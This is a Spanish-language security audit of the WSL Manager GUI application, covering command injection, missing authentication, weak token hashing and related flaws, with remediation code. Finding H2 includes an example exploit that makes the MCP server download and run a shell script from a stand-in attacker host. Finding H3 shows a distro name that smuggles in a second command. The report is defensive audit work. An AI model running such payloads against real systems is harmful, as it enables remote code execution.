# Auditoría de Seguridad Profunda — WSL Manager GUI v0.1.0

**Fecha:** 2026-08-15  
**Alcance completo:** pyproject.toml, src/api/*, src/mcp/*, src/web/*, src/core/*, src/utils/*, src/providers/*, config/*  
**Metodología:** Revisión manual de código (SAST), análisis de flujo de datos, mapeo CWE/OWASP  

---

## Resumen Ejecutivo

| Severidad | Hallazgos |
|-----------|-----------|
| Critical  | 0         |
| High      | 3         |
| Medium    | 5         |
| Low       | 6         |
| Info      | 4         |

La aplicación es razonablemente segura para su modelo de despliegue actual (**loopback local**). Sin embargo, hay 3 hallazgos **High** que serían explotables si la API/MCP se expone a la red, y varios hallazgos Medium que requieren corrección inmediata si se considera uso multi-usuario o exposición de red.

---

## Hallazgos

### H1 — Command Injection vía `run_command()` en MCP y API (High)

- **Severidad:** High
- **Ubicación:** `src/providers/wsl_provider.py:174-175` → `src/mcp/tools.py:126-128` → `src/api/routes.py` (implicito via MCP)
- **CWE:** CWE-78 (OS Command Injection) · OWASP A03 (Injection)
- **Código vulnerable:**
  ```python
  # wsl_provider.py:174-175
  def run_command(self, name: str, cmd: str) -> CommandResult:
      return self._wsl_d(name, ["--", "sh", "-lc", cmd], timeout=300)
  ```
  ```python
  # mcp/tools.py:126-128
  def tool_run_command(self, distro: str, cmd: str) -> dict:
      r = self.ctx.wsl.run_command(distro, cmd)
      return {"ok": r.ok, "output": r.output, "error": r.error or None}
  ```
  ```python
  # app.py:59 (autostart path)
  WslProvider(store).start(args.autostart_distro)
  ```
- **Descripción:** El parámetro `cmd` se pasa directamente a `sh -lc` dentro de la distro WSL sin ninguna validación o sanitización. Un atacante con acceso al MCP (transporte HTTP, `src/mcp/server.py:57`) o a la API puede ejecutar **cualquier comando** dentro de la distro WSL. Aunque `subprocess.run` se llama con lista (no `shell=True`), el shell está embebido deliberadamente en el argumento `["--", "sh", "-lc", cmd]`.
- **Impacto:** Ejecución remota de código dentro de la distro WSL. Un atacante puede:
  - Instalar backdoors, mineros, ransomware
  - Escalar a Windows vía WSL interop
  - Acceder a archivos del host vía `/mnt/c/`
- **Explotación vía MCP HTTP:** El `create_http_app()` en `server.py:34-57` expone las tools MCP sin autenticación por defecto (`mcp.token_required = false`).
- **Remediación:**
  1. Implementar allowlist de comandos permitidos (o restringir a los comandos definidos en config)
  2. Validar `cmd` contra un regex estricto o against a whitelist
  3. Implementar `mcp.token_required` (ver M3)

### H2 — MCP HTTP Server sin autenticación por defecto (High)

- **Severidad:** High
- **Ubicación:** `src/mcp/server.py:34-57` + `src/core/config.py:173-177` + `src/mcp/tools.py:39-50`
- **CWE:** CWE-306 (Missing Authentication) · OWASP A07 (Auth Failures)
- **Código vulnerable:**
  ```python
  # config.py:173-177
  class McpCfg(BaseModel):
      enabled: bool = False
      transport: Literal["stdio", "http"] = "stdio"
      port: int = 8792
      token_required: bool = False  # Default: sin autenticación
  ```
  ```python
  # mcp/server.py:34-57
  def create_http_app(ctx: CliContext):
      tools = McpTools(ctx)
      mcp = FastMCP("wsl-manager")
      # ... registra tools sin validar token ...
      return mcp.streamable_http_app()
  ```
  ```python
  # mcp/tools.py:46
  return fn(**args)  # Ejecuta sin verificar autenticación
  ```
- **Descripción:** El flag `mcp.token_required` existe en el schema de configuración pero **nunca se valida** en el código del servidor MCP. Cuando el transporte es HTTP (`mcp.transport = "http"`), todas las herramientas MCP (incluyendo `run_command`, `shutdown_all`, `start`, `stop`, `export`, etc.) quedan expuestas sin ninguna autenticación a quien escuche en el puerto 8792.
- **Impacto:** Acceso completo a todas las operaciones de WSL Manager desde la red si `--host 0.0.0.0` o si se alcanza el puerto local.
- **Explotación:** `curl -X POST http://127.0.0.1:8792/mcp -d '{"tool":"run_command","arguments":{"distro":"ubuntu","cmd":"curl attacker.com/shell.sh | sh"}}'`
- **Remediación:**
  ```python
  # En create_http_app() y run_stdio():
  if ctx.config.mcp.token_required:
      # Validar token del header Authorization antes de dispatch
      token = request.headers.get("Authorization", "").replace("Bearer ", "")
      if not verify_mcp_token(token, ctx):
          return JSONResponse({"error": "unauthorized"}, status_code=401)
  ```
  Si no se implementa la validación, **eliminar** el flag `token_required` del schema para evitar confusión.

### H3 — Autostart via registry con distro name no sanitizado (High)

- **Severidad:** High (condicional — requiere que el usuario ejecute el comando CLI)
- **Ubicación:** `src/providers/autostart_provider.py:25-33`
- **CWE:** CWE-78 (Command Injection) · CWE-94 (Code Injection)
- **Código vulnerable:**
  ```python
  # autostart_provider.py:25-33
  def _app_launch_command(distro: str, delay_s: int) -> str:
      exe = Path(sys.executable)
      if exe.name.lower() in ("pythonw.exe", "python.exe"):
          app = Path(__file__).resolve().parents[1] / "app.py"
          cmd = f'"{exe}" "{app}" --autostart-distro {distro} --delay {delay_s} --minimized'
      else:
          cmd = f'"{exe}" --autostart-distro {distro} --delay {delay_s} --minimized'
      return cmd
  ```
- **Descripción:** El nombre de la distro se interpola directamente en un string de comando que se guarda en el registro de Windows (`HKCU\...\Run`). Un nombre de distro malicioso como `ubuntu" & calc.exe & "` resultaría en ejecución de código arbitrario en el siguiente login.
- **Impacto:** Persistencia y ejecución de código al siguiente login de Windows.
- **Mitigación parcial:** La distro name viene de `wsl -l -v`, lo cual limita los caracteres posibles (WSL valida nombres). Sin embargo, no hay validación defensiva en `_app_launch_command`.
- **Remediación:**
  ```python
  def _app_launch_command(distro: str, delay_s: int) -> str:
      # Validar nombre de distro: solo alfanuméricos, guiones, guiones bajos
      import re
      if not re.match(r'^[a-zA-Z0-9._-]+$', distro):
          raise ValueError(f"nombre de distro invalido: {distro}")
      # ... resto del código
  ```

### M1 — Distro name no validado en endpoints de la API (Path traversal / command injection chain) (Medium)

- **Severidad:** Medium
- **Ubicación:** `src/api/routes.py:64-65, 73-74, 82-83, 103-104, 117-118`
- **CWE:** CWE-20 (Improper Input Validation) · CWE-22 (Path Traversal)
- **Código vulnerable:**
  ```python
  # routes.py:64-66
  @router.post("/distros/{name}/start", dependencies=[require("write")])
  def start(ctx: CliContext = Ctx, name: str = ..., request: Request = ...):
      r = ctx.wsl.start(name)
  ```
- **Descripción:** El parámetro `name` de la distro se pasa directamente a `wsl.exe -d <name>` sin validación de caracteres. Aunque FastAPI rechaza path traversal `..%2f` en URLs, un nombre como `test; malicious` podría causar comportamiento inesperado en `wsl.exe`. El nombre de distro se usa sin sanitizar en:
  - `wsl.exe --terminate <name>` (ruta de subprocess)
  - `wsl.exe --export <name> <path>` (ruta de archivo)
  - `wsl.exe -d <name> -- sh -lc <cmd>` (command injection si cmd también es attacker-controlled)
- **Impacto:** Reducido por las defensas del subprocess con lista, pero la falta de validación defensiva crea un surface de ataque innecesario.
- **Remediación:**
  ```python
  import re
  _DISTRO_RE = re.compile(r'^[a-zA-Z0-9._-]+$')
  
  def _validate_distro_name(name: str) -> str:
      if not _DISTRO_RE.match(name):
          raise HTTPException(400, "nombre de distro invalido")
      return name
  ```

### M2 — Panel web sin autenticación, susceptible a DNS rebinding / CSRF (Medium)

- **Severidad:** Medium
- **Ubicación:** `src/web/web_app.py:1-213`
- **CWE:** CWE-306 (Missing Auth) · CWE-352 (CSRF) · CWE-346 (Origin Validation)
- **Código vulnerable:**
  ```python
  # web_app.py:125-131
  def create_web_app(ctx) -> FastAPI:
      app = FastAPI(title="WSL Manager Panel", version="0.1.0")
      app.state.ctx = ctx
      apply_security_headers(app)
      # Sin autenticación en ningún endpoint
  ```
  ```python
  # web_app.py:168-175
  @app.post("/api/distros/{name}/start")
  def start(name: str):
      c = get_ctx()
      r = c.wsl.start(name)
      # Sin verificación de Origin/Host
  ```
- **Descripción:** El panel web en `127.0.0.1:8790` permite realizar acciones destructivas (stop, shutdown, restart, snapshot) **sin autenticación**. Un sitio web malicioso podría usar `fetch()` o formularios para realizar:
  - `POST /api/shutdown` → apagar todas las distros (DoS)
  - `POST /api/distros/{name}/stop` → detener distros específicas
  - `POST /api/distros/{name}/snapshot` → sobreescribir snapshots (relleno de disco)
  
  **DNS Rebinding:** Un dominio malicioso como `127-0-0-1.nip.io` puede resolver a `127.0.0.1`, permitiendo que JavaScript malicioso haga requests al panel. Aunque CORS no está habilitado explícitamente, las peticiones POST simples (sin preflight) se envían desde cross-origin.
- **Impacto:** DoS, manipulación de estado de distros.
- **Remediación:**
  1. Validar header `Host` en middleware: solo aceptar `127.0.0.1:8790`
  2. Añadir token estático opcional (`ui.web_panel_token`)
  3. Validar header `Origin` en endpoints POST

### M3 — Token hash SHA-256 sin salt (Medium)

- **Severidad:** Medium
- **Ubicación:** `src/api/auth.py:47` + `src/cli/commands_ux.py:337`
- **CWE:** CWE-760 (Use of a One-Way Hash with a Predictable Salt) · OWASP A02 (Cryptographic Failures)
- **Código vulnerable:**
  ```python
  # auth.py:47
  digest = hashlib.sha256(token.encode()).hexdigest()
  
  # commands_ux.py:337
  c.metrics.add_token(hashlib.sha256(token.encode()).hexdigest(), scope, expires, note)
  ```
- **Descripción:** Los tokens de la API se almacenan como `SHA-256(token)` sin salt. Aunque `secrets.token_urlsafe(32)` genera 256 bits de entropía (inviable de rainbow table), la ausencia de salt y key stretching es una práctica criptográfica subóptima:
  - Si un atacante obtiene la base `metrics.db`, puede intentar brute-force offline
  - No hay KDF (Key Derivation Function) que ralentice el ataque
- **Impacto:** Si `metrics.db` es filtrado (vía `diag` bundle, backup, o path traversal), los hashes son vulnerables a ataques de fuerza bruta con GPUs.
- **Remediación:**
  ```python
  import hashlib, os, secrets
  
  # Al crear:
  salt = secrets.token_bytes(16)
  digest = hashlib.pbkdf2_hmac('sha256', token.encode(), salt, 100_000)
  # Almacena: f"{salt.hex()}:{digest.hex()}"
  
  # Al verificar:
  stored_salt, stored_hash = stored.split(':')
  check = hashlib.pbkdf2_hmac('sha256', token.encode(), bytes.fromhex(stored_salt), 100_000)
  return secrets.compare_digest(check.hex(), stored_hash)
  ```

### M4 — `diag` bundle incluye config.json potencialmente con datos sensibles (Medium)

- **Severidad:** Medium
- **Ubicación:** `src/cli/commands_ux.py:134-151`
- **CWE:** CWE-200 (Exposure of Sensitive Information) · OWASP A01
- **Código vulnerable:**
  ```python
  # commands_ux.py:146
  add("config.json", json.dumps(c.store.get().model_dump(...)))
  # commands_ux.py:150
  add("logs/wsl-manager.log", logf.read_text(...)[-200_000:])
  ```
- **Descripción:** El bundle de diagnóstico `diag` incluye `config.json` completo (que puede contener `allowed_ips`, configuración de auth, puertos) y los logs completos (últimos 200KB). Si el bundle se comparte para soporte técnico, se filtra información de configuración de seguridad.
- **Impacto:** Revelación de configuración de seguridad, IPs permitidas, puertos internos.
- **Remediación:**
  1. Excluir campos sensibles del dump: `exclude={"api.auth", "mcp.token_required"}`
  2. O añadir opción `--redact` para diagnóstico seguro
  3. Incluir advertencia al generar el bundle

### M5 — `export` en CLI sin restricción de path (Medium)

- **Severidad:** Medium
- **Ubicación:** `src/cli/commands_distros.py:122-131` + `src/providers/wsl_provider.py:108-113`
- **CWE:** CWE-22 (Path Traversal) · CWE-434 (Unrestricted Upload)
- **Código vulnerable:**
  ```python
  # commands_distros.py:122-126
  def export(ctx: typer.Context, distro: str, path: str):
      c = ctx.obj
      r = c.wsl.export(distro, path)  # path no validado
  
  # wsl_provider.py:108-113
  def export(self, name: str, target: str) -> CommandResult:
      target_path = Path(target)
      target_path.parent.mkdir(parents=True, exist_ok=True)
      if target_path.exists():
          target_path.unlink()
      return self._wsl(["--export", name, str(target_path)], timeout=600)
  ```
- **Descripción:** El endpoint API fue parcheado (M1 del reporte anterior), pero la ruta CLI `export` sigue permitiendo cualquier path de destino. Un usuario podría exportar a `C:\Windows\System32\malicious.tar` (si tiene permisos) o a rutas de red UNC.
- **Impacto:** Escritura arbitraria de archivos (con contenido de tar de la distro) en cualquier ubicación del filesystem.
- **Remediación:** Aplicar la misma restricción que se implementó en `routes.py`, o al menos añadir confirmación interactiva para paths fuera de `snapshot_dir()`.

### L1 — `allowed_ips` vacío desactiva el filtro IP (Low)

- **Severidad:** Low
- **Ubicación:** `src/api/auth.py:58`
- **CWE:** CWE-183 (Permissive List-based Allowlist)
- **Código vulnerable:**
  ```python
  # auth.py:58
  if self._cfg.allowed_ips and client_ip not in self._cfg.allowed_ips:
      raise HTTPException(status_code=403, detail=f"IP no permitida: {client_ip}")
  ```
- **Descripción:** Si `allowed_ips` se configura como lista vacía `[]` (manualmente o por error), la condición `self._cfg.allowed_ips` es `False` (lista vacía es falsy en Python), y el filtro de IP **se desactiva completamente**. Esto permite acceso desde cualquier IP.
- **Impacto:** Eludir el whitelist de IPs sin notificación.
- **Remediación:**
  ```python
  if self._cfg.auth.mode == "token" and not self._cfg.allowed_ips:
      raise ConfigError("mode=token requiere allowed_ips no vacío")
  ```

### L2 — Headers de seguridad incompletos (sin Content-Security-Policy) (Low)

- **Severidad:** Low
- **Ubicación:** `src/api/server.py:11-16`
- **CWE:** CWE-693 (Protection Mechanism Failure) · OWASP A05
- **Código vulnerable:**
  ```python
  SECURITY_HEADERS = {
      "X-Content-Type-Options": "nosniff",
      "X-Frame-Options": "DENY",
      "Referrer-Policy": "no-referrer",
      "Permissions-Policy": "geolocation=(), microphone=(), camera=()",
  }
  # FALTA: Content-Security-Policy
  # FALTA: Strict-Transport-Security (si se usa HTTPS)
  ```
- **Descripción:** Se aplican headers de seguridad, pero falta `Content-Security-Policy` (CSP). El panel web (`web_app.py`) inyecta JavaScript inline extenso (L13-122), lo que dificulta la implementación de CSP estricto pero no imposible con `unsafe-inline` temporariamente.
- **Impacto:** Sin CSP, el panel es más susceptible a XSS si se rompe la función `esc()`.
- **Remediación:**
  ```python
  SECURITY_HEADERS["Content-Security-Policy"] = "default-src 'self'; script-src 'unsafe-inline'; style-src 'unsafe-inline'"
  ```

### L3 — Error messages filtran información (Low)

- **Severidad:** Low
- **Ubicación:** `src/api/auth.py:59`, `src/api/routes.py:68-69`
- **CWE:** CWE-209 (Information Exposure Through Error Messages) · OWASP A05
- **Código vulnerable:**
  ```python
  # auth.py:59
  raise HTTPException(status_code=403, detail=f"IP no permitida: {client_ip}")
  
  # routes.py:68 (pre-patch)
  raise _fail(r.error)  # r.error puede contener detalles del sistema
  ```
- **Descripción:** El mensaje de error 403 confirma que hay un filtro de IP activo y revela la IP del cliente. Aunque `_fail()` ahora retorna un mensaje genérico, el endpoint de auth expone información sobre el mecanismo de protección.
- **Impacto:** Reconocimiento para un atacante.
- **Remediación:** Usar mensajes genéricos: `"acceso denegado"` en lugar de `"IP no permitida: {ip}"`.

### L4 — `metrics.db` SQLite con `check_same_thread=False` (Low)

- **Severidad:** Low
- **Ubicación:** `src/core/metrics_store.py:62`
- **CWE:** CWE-362 (Race Condition)
- **Código vulnerable:**
  ```python
  # metrics_store.py:62
  self._conn = sqlite3.connect(str(self.path), check_same_thread=False)
  ```
- **Descripción:** Se desactiva la verificación de thread de SQLite. Aunque se usa `threading.RLock()` para proteger operaciones, una carrera entre `_exec()` y `_query()` en threads diferentes podría causar `database is locked` o corrupción si el lock falla.
- **Impacto:** Bajo en la práctica (el lock está bien usado), pero la configuración es inherentemente riesgosa.
- **Remediación:** Considerar usar WAL mode (`PRAGMA journal_mode=WAL`) para mejor concurrencia, o connections separadas por thread.

### L5 — `try/except: pass` oculta errores potencialmente importantes (Low)

- **Severidad:** Low
- **Ubicación:** `src/cli/cli.py:44`, `src/gui/tabs/monitor_tab.py:35`, `src/gui/tray.py:114`
- **CWE:** CWE-703 (Improper Check or Handling of Exceptional Conditions)
- **Código vulnerable:**
  ```python
  # cli.py:43-45
  try:
      stream.reconfigure(encoding="utf-8", errors="replace")
  except Exception:
      pass
  ```
- **Descripción:** Los errores se silencian completamente. Si el encoding falla inesperadamente, la app continúa sin diagnóstico.
- **Impacto:** Perdida de información de debugging; bajo riesgo de seguridad directo.
- **Remediación:** Al menos log a nivel DEBUG: `log.debug("no se pudo reconfigurar stream: %s", e)`

### L6 — Rate limit bypassable por reinicio de proceso (Low)

- **Severidad:** Low
- **Ubicación:** `src/api/auth.py:30-40`
- **CWE:** CWE-799 (Improper Control of Interaction Frequency)
- **Código vulnerable:**
  ```python
  # auth.py:25, 34-39
  self._hits: dict[str, list[float]] = {}  # In-memory, se pierde al reiniciar
  
  def _check_rate(self, client_ip: str) -> None:
      # ...
      if len(hits) > limit:
          raise HTTPException(status_code=429, detail="rate limit excedido")
  ```
- **Descripción:** El rate limiting se almacena en memoria. Un reinicio del servidor resetea todos los contadores. Un atacante puede forzar un reinicio (via crash, resource exhaustion) para obtener un nuevo window de requests.
- **Impacto:** Bypass del rate limit mediante reinicio del proceso.
- **Remediación:** Persistir contadores en SQLite o usar un middleware de rate limiting externo.

---

## Info — Observaciones sin impacto directo

### I1 — Dependencias sin versiones pinned (Info)

- **Ubicación:** `pyproject.toml:12-21, 24-31`
- **Código:**
  ```toml
  dependencies = [
      "ttkbootstrap>=1.10",  # Mínimo, sin máximo
      "fastapi>=0.110",       # Puede instalar versión con CVE futuro
      "uvicorn>=0.29",
      "pydantic>=2.6",
  ]
  ```
- **Observación:** `pip-audit` reporta 0 CVEs conocidas actualmente, pero las versiones sin upper-bound significan que un `pip install` futuro podría instalar una versión vulnerable. Se recomienda generar un `requirements.txt` lockeado.
- **Estado actual:** Sin CVEs conocidas en las dependencias listadas.

### I2 — `uvicorn` bind a `0.0.0.0` permitido sin advertencia (Info)

- **Ubicación:** `src/cli/commands_ux.py:380, 424`
- **Código:**
  ```python
  # commands_ux.py:380
  @web_app.command("serve")
  def web_serve(ctx, port=8790, host="127.0.0.1"):
      uvicorn.run(create_web_app(ctx.obj), host=host, port=port)
  ```
- **Observación:** `wsl-manager web serve --host 0.0.0.0` expone el panel (sin auth) a toda la red local. No hay advertencia ni validación. `run_server` (L424) igualmente.
- **Recomendación:** Si `host != 127.0.0.1`, imprimir advertencia amarilla y exigir token.

### I3 — Sin Content-Security-Policy en panel web (Info)

- **Ubicación:** `src/web/web_app.py:13-121`
- **Observación:** El panel web usa JavaScript inline extenso (~100 líneas). La función `esc()` (L63) previene XSS correctamente usando `textContent → innerHTML`. Sin embargo, no hay CSP como segunda línea de defensa.
- **Estado:** `esc()` fue verificada manualmente — es correcta.

### I4 — UUID generado con `uuid.uuid4().hex[:8]` para task IDs (Info)

- **Ubicación:** `src/mcp/tools.py:111`
- **Código:**
  ```python
  task = ScheduleTask(
      id=f"tarea-{uuid.uuid4().hex[:8]}",
  ```
- **Observación:** Solo 32 bits de entropía (8 hex chars) para el ID de tarea. Aunque no es un vector de seguridad directo, es trunca la entropía innecesariamente.
- **Recomendación:** Usar `uuid.uuid4().hex` completo (128 bits) o `secrets.token_hex(8)`.

---

## Controles Verificados (Positivos)

| Control | Estado | Detalle |
|---------|--------|---------|
| **SQL Injection** | ✅ OK | Todas las queries en `metrics_store.py` usan parámetros `?` con tuple params. Sin f-strings en SQL. Verificado en L85-87, L99, L106-107, L114-116, L126, L147, L180-182, L188-189, L207, L220. |
| **subprocess con shell=True** | ✅ OK | `subprocess_async.py` usa `subprocess.run(args_list)` sin `shell=True`. B603 de bandit es un falso positivo (CWE-78 no aplicable sin shell=True). |
| **XSS en panel web** | ✅ OK | Función `esc()` (L63) usa `createElement('div') + textContent = s + innerHTML` que es el patrón correcto para escape HTML. Verificado en todos los usos: `esc(d.name)`, `esc(d.state)`, `esc(a.tipo)`, `esc(a.message)`. |
| **Validación de entrada** | ✅ OK | Pydantic v2 en todas las rutas. Validación automática de tipos, campos requeridos, Literals restringidos. Payloads malformados retornan 422. |
| **Rate limiting en API protegida** | ✅ OK | `auth.py:30-40` implementa sliding window de 60s. Verificado: `rate_limit_per_minute: 5` → 5×200 → 429. |
| **Server header oculto** | ✅ OK | `server_header=False` en todos los `uvicorn.run()` calls: `app.py:194`, `app.py:213`, `commands_ux.py:386`, `commands_ux.py:424`. |
| **Secretos hardcodeados** | ✅ OK | Sin API keys, passwords, o tokens hardcodeados en el código fuente. Token se genera con `secrets.token_urlsafe(32)` (256 bits). |
| `config.json` tmp write segura | ✅ OK | `config.py:250-252` usa `.tmp` + `replace()` atómico. |

---

## Análisis de Dependencias (pyproject.toml)

| Paquete | Versión Mín. | CVEs Conocidos | Notas |
|---------|-------------|----------------|-------|
| ttkbootstrap | ≥1.10 | 0 | GUI toolkit, bajo attack surface |
| pystray | ≥0.19 | 0 | System tray, solo local |
| Pillow | ≥10 | **0 (actualmente)** | CVE-2023-44271 patcheado en 10.0. Usar `>=10.4` para asegurar |
| psutil | ≥5.9 | 0 | System metrics |
| pydantic | ≥2.6 | 0 | Validación de datos |
| pyyaml | ≥6.0 | 0 | YAML parsing (no usado activamente en el core) |
| typer | ≥0.12 | 0 | CLI framework |
| fastapi | ≥0.110 | 0 | API framework |
| uvicorn | ≥0.29 | 0 | ASGI server |
| httpx | ≥0.27 | 0 | HTTP client |
| mcp | ≥1.0 | 0 | MCP protocol (nuevo, monitorear) |

**Recomendación:** Añadir upper bounds a Pillow (`Pillow>=10.4,<11`) y crear lock file con `pip freeze > requirements.txt`.

---

## Tabla Mapeo OWASP / CWE

| ID | Hallazgo | OWASP Top 10 | CWE | MITRE ATT&CK |
|----|----------|--------------|-----|--------------|
| H1 | Command injection via run_command | A03:2021 Injection | CWE-78 | T1059.004 Command and Scripting Interpreter: Unix Shell |
| H2 | MCP HTTP sin auth | A07:2021 Auth Failures | CWE-306 | T1078 Valid Accounts |
| H3 | Autostart command injection | A03:2021 Injection | CWE-78 | T1059.005 Command and Scripting Interpreter: Visual Basic |
| M1 | Distro name no validado | A01:2021 Broken Access Control | CWE-20 | T1190 Exploit Public-Facing Application |
| M2 | Panel web sin auth/CSRF | A01:2021 Broken Access Control | CWE-306, CWE-352 | T1190, T1053.005 |
| M3 | Token hash sin salt | A02:2021 Cryptographic Failures | CWE-760 | — |
| M4 | Diag bundle con secrets | A01:2021 Broken Access Control | CWE-200 | T1005 Data from Local System |
| M5 | CLI export sin path restriction | A01:2021 Broken Access Control | CWE-22 | T1570 Lateral Tool Transfer |
| L1 | allowed_ips vacío desactiva filtro | A01:2021 Broken Access Control | CWE-183 | — |
| L2 | Sin CSP header | A05:2021 Security Misconfiguration | CWE-693 | — |
| L3 | Error messages informativos | A05:2021 Security Misconfiguration | CWE-209 | — |
| L4 | SQLite check_same_thread=False | A05:2021 Security Misconfiguration | CWE-362 | — |
| L5 | try/except pass | A05:2021 Security Misconfiguration | CWE-703 | — |
| L6 | Rate limit in-memory | A05:2021 Security Misconfiguration | CWE-799 | — |

---

## Priorización de Remediación

### Inmediato (esta semana)
1. **H1** — Implementar validación de `cmd` en `run_command()` (allowlist de comandos)
2. **H2** — Implementar `mcp.token_required` o eliminar el flag
3. **M1** — Añadir validación regex de distro names en todas las rutas

### Corto plazo (2 semanas)
4. **H3** — Validar distro name en `_app_launch_command()`
5. **M2** — Token + Host validation en panel web
6. **M3** — Migrar a `pbkdf2_hmac` con salt para token hashes
7. **M5** — Restringir path en CLI export

### Medio plazo (1 mes)
8. **M4** — Redactar datos sensibles en `diag` bundle
9. **L1** — Validar `allowed_ips` no vacío en `mode=token`
10. **L2** — Añadir CSP header
11. **L6** — Persistir rate limit counters

---

*Generado automáticamente por auditoría de código — 2026-08-15*
